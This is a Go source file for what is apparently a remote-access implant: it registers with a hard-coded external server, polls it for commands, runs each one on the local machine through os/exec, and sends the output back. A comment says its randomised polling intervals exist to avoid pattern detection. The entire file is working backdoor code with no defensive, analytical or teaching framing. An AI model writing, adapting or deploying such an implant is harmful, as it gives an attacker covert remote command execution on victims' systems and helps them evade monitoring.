package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

const SERVER_BASE = "https://d36658cf-4a52-46ab-8212-df0a08f93498.deepnoteproject.com"

func main() {
	rand.Seed(time.Now().UnixNano())

	// Register client
	clientID, err := registerClient()
	if err != nil {
		fmt.Println("Registration failed:", err)
		return
	}

	commandURL := fmt.Sprintf("%s/commands?client_id=%s", SERVER_BASE, clientID)
	resultURL := fmt.Sprintf("%s/results", SERVER_BASE)

	cmdChannel := make(chan string, 1)

	// Heartbeat / polling goroutine
	go func() {
		for {
			cmd, err := getCommand(commandURL)
			if err == nil && cmd != "" {
				cmdChannel <- cmd // send command to main executor
			}
			time.Sleep(randomInterval(1))
		}
	}()

	// Main executor loop
	for cmd := range cmdChannel {
		if strings.ToLower(cmd) == "exit" || strings.ToLower(cmd) == "quit" {
			break
		}

		output := runCommand(cmd, 10*time.Second) // timeout 10s for long commands
		_ = sendResult(resultURL, clientID, output)
	}
}

// randomInterval adds random delay to prevent pattern detection
func randomInterval(base int) time.Duration {
	return time.Duration(base+rand.Intn(2000)) * time.Millisecond
}

// registerClient gets a unique client ID from the server
func registerClient() (string, error) {
	resp, err := http.Post(fmt.Sprintf("%s/register_client", SERVER_BASE), "application/x-www-form-urlencoded", nil)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), nil
}

// getCommand polls the server for a new command
func getCommand(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), nil
}

// runCommand executes a command with a timeout
func runCommand(cmd string, timeout time.Duration) string {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}
	head := parts[0]
	args := parts[1:]

	c := exec.Command(head, args...)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out

	if err := c.Start(); err != nil {
		return fmt.Sprintf("[!] Start error: %v", err)
	}

	done := make(chan error, 1)
	go func() { done <- c.Wait() }()

	select {
	case <-time.After(timeout):
		_ = c.Process.Kill()
		return fmt.Sprintf("[!] Command timed out: %s", cmd)
	case err := <-done:
		if err != nil {
			return fmt.Sprintf("[!] Execution error: %v\n%s", err, out.String())
		}
		return out.String()
	}
}

// sendResult posts command output back to the server
func sendResult(url, clientID, result string) error {
	data := fmt.Sprintf("client_id=%s&result=%s", clientID, result)
	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(data)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
